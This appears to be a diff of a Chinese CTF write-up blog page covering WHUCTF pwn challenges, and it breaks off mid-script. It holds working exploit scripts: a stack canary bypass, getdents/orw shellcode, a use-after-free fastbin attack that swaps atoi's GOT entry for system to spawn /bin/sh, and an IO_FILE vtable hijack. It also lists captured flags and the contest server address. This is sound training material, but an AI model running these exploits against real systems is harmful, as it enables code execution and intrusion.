+f2(&quot;b&quot;*0x38+p64(canary)+p64(0x202020+elf_base)+p64(0x202060+elf_base))
+# 0x202060+elf_base
+
+r.interactive()</code></pre>
 <blockquote>
 <p>WHUCTF{Do_yOu_kNow_canary}</p>
 </blockquote>
 <h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>沙盒逃逸（？）的<code>orw</code> ，这里参考了一下<a href="https://www.jianshu.com/p/f74964be92f6" target="_blank" rel="noopener">民间答案</a>,用到<code>getdents</code> 扫描服务器文件夹，找到flag位置。不能直接用sh貌似是因为<code>mprotect</code> （？）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getdents</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, struct linux_dirent *dirp,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>;</span><br><span class="line"><span class="comment">// 从文件描述符fd中读取长度为count的内容到dirp所指的区域</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">int getdents(unsigned int fd, struct linux_dirent *dirp,
+                    unsigned int count);
+// 从文件描述符fd中读取长度为count的内容到dirp所指的区域</code></pre>
 <p>第一阶段扫描整个目录，先<code>open</code> 得到的fd会存放在rax中，然后<code>getdents</code>扫描存放在<code>rsp</code> 中，然后<code>write</code> 出来</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.open(<span class="string">"./"</span>,<span class="number">0x10000</span>)</span><br><span class="line">shellcode += shellcraft.getdents(<span class="string">"rax"</span>,<span class="string">"rsp"</span>,<span class="number">0x300</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">"rsp"</span>,<span class="number">0x300</span>)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">shellcode = shellcraft.open(&quot;./&quot;,0x10000)
+shellcode += shellcraft.getdents(&quot;rax&quot;,&quot;rsp&quot;,0x300)
+shellcode += shellcraft.write(1,&quot;rsp&quot;,0x300)</code></pre>
 <p>可以看到结果可以勉强辨认，与当前文件夹内容相同（本地测试）</p>
 <p><img src="https://i.loli.net/2020/06/10/hREvTwMp2m3HJCt.png" alt=""></p>
 <p>拿到服务器上跑，可以发现有个FFFFFFFFFlag文件夹，进一步解析这个文件夹发现flag在里面，打印出来即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcraft.open(<span class="string">"./FFFFFFFFFlag/flag"</span>,<span class="number">0</span>)</span><br><span class="line">payload += shellcraft.read(<span class="string">"rax"</span>,<span class="string">"rsp"</span>,<span class="number">0x300</span>)</span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>,<span class="string">"rsp"</span>,<span class="number">0x300</span>)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">payload = shellcraft.open(&quot;./FFFFFFFFFlag/flag&quot;,0)
+payload += shellcraft.read(&quot;rax&quot;,&quot;rsp&quot;,0x300)
+payload += shellcraft.write(1,&quot;rsp&quot;,0x300)</code></pre>
 <p>可以看到<code>read</code> 只能读取文件，而<code>getdents</code> 能读取文件夹</p>
 <blockquote>
 <p>WHUCTF{ORWOWRROWRWOWORWRO_779243c8c5097c6920d52b79d31f0d4a}</p>
 </blockquote>
 <h2 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h2><p><code>uaf</code>+<code>fastbin attack</code>打<code>got</code>表，构造chunk size即可，比较简单。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import pwn_framework as pf</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p  : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a,b : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t : p.recvrepeat(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64 or x86</span></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"./pwn"</span></span><br><span class="line">ip = <span class="string">"218.197.154.9"</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span> <span class="keyword">if</span> len(sys.argv)==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> bps <span class="comment"># Break Points</span></span><br><span class="line"><span class="keyword">global</span> gds <span class="comment"># Gdb Debug Symbols</span></span><br><span class="line">bps = []</span><br><span class="line">gds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">remote_libc = <span class="string">"./libc-2.23.so"</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="comment"># io = process(filename,aslr=False)</span></span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # if LD_PRELOAD multiple libs, split with ':'</span></span><br><span class="line">    <span class="comment"># io = process(filename, env=&#123;'LD_PRELOAD': remote_libc&#125;) </span></span><br><span class="line">    <span class="comment">#libc = ELF(remote_libc)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    <span class="comment"># libc = elf.libc</span></span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydebug</span><span class="params">(p, s=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_bstr</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> bps</span><br><span class="line">        b_str =<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> break_point <span class="keyword">in</span> bps:</span><br><span class="line">            <span class="keyword">if</span> type(break_point) == int:</span><br><span class="line">                b_str += <span class="string">"b *%s\n"</span>%(hex(break_point))</span><br><span class="line">            <span class="keyword">elif</span> type(break_point) == str:</span><br><span class="line">                b_str += <span class="string">"b %s\n"</span>%(break_point)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pause(p, <span class="string">"[_get_bstr] unsupported break point type : "</span>+str(break_point))</span><br><span class="line">        <span class="keyword">return</span> b_str</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_gds_str</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> gds</span><br><span class="line">        res = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> gds:</span><br><span class="line">            val = gds[name]</span><br><span class="line">            <span class="keyword">if</span> type(name) != str:</span><br><span class="line">                pause(p, <span class="string">"[_get_gds_str] unsupported name type : "</span>+str(type(name)))</span><br><span class="line">            <span class="keyword">if</span> type(val) != int:</span><br><span class="line">                pause(p, <span class="string">"[_get_gds_str] unsupported val type : "</span>+str(type(val)))</span><br><span class="line">            res += <span class="string">"set $%s=%d\n"</span>%(name, gds[name])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, _get_bstr()+_get_gds_str()+s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause</span><span class="params">(p, s = <span class="string">'pause'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        print(<span class="string">'pid: '</span> + str(p.pid))</span><br><span class="line">        <span class="keyword">return</span> raw_input(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> raw_input(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    sla(p, XXX, str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(name, val)</span>:</span></span><br><span class="line">    log.info(name+<span class="string">" : "</span>+hex(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    sla(io,<span class="string">"your choice :\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name,data)</span>:</span></span><br><span class="line">    sla(io,<span class="string">"your choice :\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sa(io,<span class="string">'name:\n'</span>,name)</span><br><span class="line">    sla(io,<span class="string">'data:\n'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sla(io,<span class="string">"your choice :\n"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    sla(io,<span class="string">"your choice :\n"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause(io)</span><br><span class="line"><span class="comment"># mydebug(io,"b *0x0400906")</span></span><br><span class="line">fake_chunk = <span class="number">0x06010A0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(p64(fake_chunk),<span class="string">'b'</span>)</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(p64(elf.got[<span class="string">'atoi'</span>]),<span class="string">'c'</span>)</span><br><span class="line">show()</span><br><span class="line">ru(io,<span class="string">"name:"</span>)</span><br><span class="line">atoi_addr = u64(rv(io,<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">lg(<span class="string">"base:"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">edit(p64(sys),<span class="string">'d'</span>)</span><br><span class="line">sla(io,<span class="string">"your choice :\n"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#coding:utf-8
+from pwn import *
+# import pwn_framework as pf
+from time import sleep
+import sys
 
+global io
+ru = lambda p, x : p.recvuntil(x)
+sn = lambda p, x : p.send(x)
+rl = lambda p  : p.recvline()
+sl = lambda p, x : p.sendline(x)
+rv = lambda p, x : p.recv(numb = x)
+sa = lambda p, a,b : p.sendafter(a,b)
+sla = lambda p, a,b : p.sendlineafter(a,b)
+rr = lambda p, t : p.recvrepeat(t)
+
+# amd64 or x86
+context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, endian = &#39;little&#39;)
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+filename = &quot;./pwn&quot;
+ip = &quot;218.197.154.9&quot;
+port = 10002
+
+LOCAL = True if len(sys.argv)==1 else False
+
+global bps # Break Points
+global gds # Gdb Debug Symbols
+bps = []
+gds = {}
+
+elf = ELF(filename)
+
+remote_libc = &quot;./libc-2.23.so&quot;
+if LOCAL:
+    io = process(filename)
+    # io = process(filename,aslr=False)
+    libc = elf.libc
+
+    # # if LD_PRELOAD multiple libs, split with &#39;:&#39;
+    # io = process(filename, env={&#39;LD_PRELOAD&#39;: remote_libc}) 
+    #libc = ELF(remote_libc)
+else:
+    context.log_level = &#39;debug&#39;
+    io = remote(ip, port)
+    # libc = elf.libc
+    libc = ELF(remote_libc)
+
+def mydebug(p, s=&#39;&#39;):
+    def _get_bstr():
+        global bps
+        b_str =&quot;&quot;
+        for break_point in bps:
+            if type(break_point) == int:
+                b_str += &quot;b *%s\n&quot;%(hex(break_point))
+            elif type(break_point) == str:
+                b_str += &quot;b %s\n&quot;%(break_point)
+            else:
+                pause(p, &quot;[_get_bstr] unsupported break point type : &quot;+str(break_point))
+        return b_str
+    def _get_gds_str():
+        global gds
+        res = &quot;&quot;
+        for name in gds:
+            val = gds[name]
+            if type(name) != str:
+                pause(p, &quot;[_get_gds_str] unsupported name type : &quot;+str(type(name)))
+            if type(val) != int:
+                pause(p, &quot;[_get_gds_str] unsupported val type : &quot;+str(type(val)))
+            res += &quot;set $%s=%d\n&quot;%(name, gds[name])
+        return res
+    if not LOCAL:
+        return
+    gdb.attach(p, _get_bstr()+_get_gds_str()+s)
+
+def pause(p, s = &#39;pause&#39;):
+    if LOCAL:
+        print(&#39;pid: &#39; + str(p.pid))
+        return raw_input(s)
+    else:
+        return raw_input(s)
+
+def choice(p, idx):
+    sla(p, XXX, str(idx))
+
+def lg(name, val):
+    log.info(name+&quot; : &quot;+hex(val))
+
+def add():
+    sla(io,&quot;your choice :\n&quot;,&quot;1&quot;)
+
+def edit(name,data):
+    sla(io,&quot;your choice :\n&quot;,&quot;2&quot;)
+    sa(io,&#39;name:\n&#39;,name)
+    sla(io,&#39;data:\n&#39;,data)
+
+def show():
+    sla(io,&quot;your choice :\n&quot;,&quot;4&quot;)
+
+def free():
+    sla(io,&quot;your choice :\n&quot;,&quot;3&quot;)
+
+
+pause(io)
+# mydebug(io,&quot;b *0x0400906&quot;)
+fake_chunk = 0x06010A0
+for i in range(0x40):
+    add()
+
+free()
+edit(p64(fake_chunk),&#39;b&#39;)
+add()
+add()
+edit(p64(elf.got[&#39;atoi&#39;]),&#39;c&#39;)
+show()
+ru(io,&quot;name:&quot;)
+atoi_addr = u64(rv(io,6)+&#39;\x00\x00&#39;)
+libc_base = atoi_addr - libc.sym[&#39;atoi&#39;]
+lg(&quot;base:&quot;,libc_base)
+sys = libc_base + libc.sym[&#39;system&#39;]
+
+edit(p64(sys),&#39;d&#39;)
+sla(io,&quot;your choice :\n&quot;,&quot;/bin/sh&quot;)
+
+io.interactive()
+</code></pre>
 <blockquote>
 <p>WHUCTF{Should_You_Attack_Bss}</p>
 </blockquote>
@@ -199,11 +535,68 @@
 <p><del>这题花的时间最长还是没有解决，不太清楚IO FILE结构体哪些东西需要赋值为哪些特殊的值才能通过检测，又得看源码了吗/(ㄒoㄒ)/</del> <del>最骚的是跑官方wp可以跑通，一挂上gdb就崩，导致无法调试，擦这什么神必题目</del></p>
 <p><a href="https://xz.aliyun.com/t/2608" target="_blank" rel="noopener">https://xz.aliyun.com/t/2608</a> 可以按照2018网鼎杯Lilac提供的blind题解（葵佬nb！）构造IO_FILE</p>
 <p>令vtable指向<code>addr+240</code> ，然后在<code>addr+240</code>中构造虚表，把<code>xsputn</code> 位置改为one_gadget就能在下次调用<code>printf</code> 的时候getshell</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">void * funcs[] = {
+   1 NULL, // &quot;extra word&quot;
+   2 NULL, // DUMMY
+   3 exit, // finish
+   4 NULL, // overflow
+   5 NULL, // underflow
+   6 NULL, // uflow
+   7 NULL, // pbackfail
+   8 NULL, // xsputn  #printf
+    ...
+}</code></pre>
 <p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./pwn"</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># io = remote("218.197.154.9",10006)</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">gdb.attach(io,<span class="string">"b *0x555555554B60"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rread</span><span class="params">(offset)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"Offset:\n"</span>,str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wwrite</span><span class="params">(offset,size,data)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"Offset:\n"</span>,str(offset))</span><br><span class="line">	io.sendlineafter(<span class="string">"Size:\n"</span>,str(size))</span><br><span class="line">	io.sendlineafter(<span class="string">"Input data:\n"</span>,data)</span><br><span class="line">	</span><br><span class="line">io.recvuntil(<span class="string">"Gift:\n"</span>)</span><br><span class="line">addr = int(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">elf_base = addr - <span class="number">0x202060</span></span><br><span class="line">success(<span class="string">"elf_base:"</span>+hex(elf_base))</span><br><span class="line"></span><br><span class="line">rread(<span class="number">-0x40</span>)</span><br><span class="line">io.recvuntil(<span class="string">"This is your data:\n"</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x7f2f223cb620</span>+<span class="number">0x7f2f22006000</span></span><br><span class="line">success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad8800</span>)+p64(addr)*<span class="number">7</span></span><br><span class="line">payload += p64(addr+<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(addr)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(addr)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(addr)+p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(addr+<span class="number">240</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">print(len(payload))</span><br><span class="line">wwrite(<span class="number">0</span>, <span class="string">"-1"</span>, payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"-48"</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(str(<span class="number">8</span>))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(p64(addr))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+context.log_level = &#39;debug&#39;
+
+io = process(&quot;./pwn&quot;,aslr=False)
+# io = remote(&quot;218.197.154.9&quot;,10006)
+elf = ELF(&quot;./pwn&quot;)
+# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+gdb.attach(io,&quot;b *0x555555554B60&quot;)
+
+def rread(offset):
+    io.sendlineafter(&quot;Choice:&quot;,&quot;1&quot;)
+    io.sendlineafter(&quot;Offset:\n&quot;,str(offset))
+
+def wwrite(offset,size,data):
+    io.sendlineafter(&quot;Choice:&quot;,&quot;2&quot;)
+    io.sendlineafter(&quot;Offset:\n&quot;,str(offset))
+    io.sendlineafter(&quot;Size:\n&quot;,str(size))
+    io.sendlineafter(&quot;Input data:\n&quot;,data)
+
+io.recvuntil(&quot;Gift:\n&quot;)
+addr = int(io.recv(14),16)
+elf_base = addr - 0x202060
+success(&quot;elf_base:&quot;+hex(elf_base))
+
+rread(-0x40)
+io.recvuntil(&quot;This is your data:\n&quot;)
+libc_base = u64(io.recv(6)+&#39;\x00\x00&#39;)-0x7f2f223cb620+0x7f2f22006000
+success(&quot;libc_base:&quot;+hex(libc_base))
+
+
+payload = p64(0xfbad8800)+p64(addr)*7
+payload += p64(addr+1)+p64(0)*4+p64(addr)+p64(1)
+payload += p64(0xffffffffffffffff)+p64(0)+p64(addr)+p64(0xffffffffffffffff)
+payload += p64(0)+p64(addr)+p64(0)*3+p32(0xffffffff)+p32(0)+p64(0)*2+p64(addr+240)
+
+payload += p64(0)*7 + p64(libc_base + 0x4526a)
+print(len(payload))
+wwrite(0, &quot;-1&quot;, payload)
+io.recv()
+io.sendline(&quot;2&quot;)
+io.recv()
+io.sendline(&quot;-48&quot;)
+io.recv()
+io.sendline(str(8))
+io.recv()
+
+io.sendline(p64(addr))</code></pre>
 <blockquote>
 <p>WHUCTF{Bss_Overflow_And_File_Struct_Exploitation}</p>
 </blockquote>
@@ -218,8 +611,61 @@
 <p>当系统执行exit(0)时调用<code>_IO_flush_all_lockp</code>函数，该函数寻找下一个<code>_IO_FILE</code>结构体，将调用该结构体vtable中的<code>_IO_OVERFLOW函数</code> (位于vtable+0x18处)，虚表见上</p>
 </blockquote>
 <p>详情参考<a href="https://docs.qq.com/doc/DUGp2TFBBb1hFRm11?pub=1&amp;dver=2.1.0" target="_blank" rel="noopener">https://docs.qq.com/doc/DUGp2TFBBb1hFRm11?pub=1&amp;dver=2.1.0</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">env=os.environ</span><br><span class="line">env[<span class="string">'LD_PRELOAD'</span>]=<span class="string">'./heaptrick.so'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#r=process('./heaptrick')</span></span><br><span class="line">r=remote(<span class="string">'218.197.154.9'</span>,<span class="number">10003</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    